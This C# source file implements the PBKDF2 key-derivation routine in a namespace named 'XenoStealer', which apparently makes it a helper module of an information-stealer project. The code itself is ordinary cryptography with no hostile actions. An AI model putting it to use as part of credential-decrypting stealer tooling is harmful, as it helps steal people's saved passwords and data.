using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public class PBKDF2
    {
        private int blockSize;
        private uint blockIndex = 1;
        private byte[] bufferBytes;
        private int bufferStartIndex=0;
        private int bufferEndIndex=0;

        private byte[] salt;
        private HMAC algo;
        private int interations;

        public PBKDF2(HMAC algo, byte[] password, byte[] salt, int interations) 
        { 
            algo.Key = password;
            this.algo = algo;
            this.salt = salt;
            blockSize = algo.HashSize / 8;
            this.interations = interations;
            bufferBytes = new byte[blockSize];
        }


        public byte[] ComputeHash(int keySize) 
        {
            byte[] result = new byte[keySize];
            int resultOffset = 0;
            int bufferCount = bufferEndIndex - bufferStartIndex;

            if (bufferCount > 0) 
            {
                if (keySize < bufferCount)
                {
                    Array.Copy(bufferBytes, bufferStartIndex, result, 0, keySize);
                    bufferStartIndex += keySize;
                    return result;
                }
                Array.Copy(bufferBytes, bufferStartIndex, result, 0, bufferCount);
                bufferStartIndex = 0;
                bufferEndIndex = 0;
                resultOffset += bufferCount;
            }

            while (resultOffset < keySize)
            {
                int needCount = keySize - resultOffset;

                byte[] hashInput = new byte[salt.Length + 4];
                Array.Copy(salt, 0, hashInput, 0, salt.Length);
                Array.Copy(GetBytesFromUInt(blockIndex), 0, hashInput, salt.Length, 4);
                byte[] hash = algo.ComputeHash(hashInput);

                bufferBytes = hash;
                for (var i = 2; i <= interations; i++)
                {
                    hash = algo.ComputeHash(hash, 0, hash.Length);
                    for (var j = 0; j < blockSize; j++)
                    {
                        bufferBytes[j] = (byte)(bufferBytes[j] ^ hash[j]);
                    }
                }
                if (blockIndex == uint.MaxValue) 
                {
                    return null;
                }
                blockIndex += 1;
                if (needCount > blockSize)
                {
                    Array.Copy(bufferBytes, 0, result, resultOffset, blockSize);
                    resultOffset += blockSize;
                }
                else
                {
                    Array.Copy(bufferBytes, 0, result, resultOffset, needCount);
                    bufferStartIndex = needCount;
                    bufferEndIndex = blockSize;
                    break;
                }
            }

            return result;

        }


        private static byte[] GetBytesFromUInt(uint i)
        {
            var bytes = BitConverter.GetBytes(i);

            if (BitConverter.IsLittleEndian) 
            {
                Array.Reverse(bytes);
            }

            return bytes;
        }

    }
}
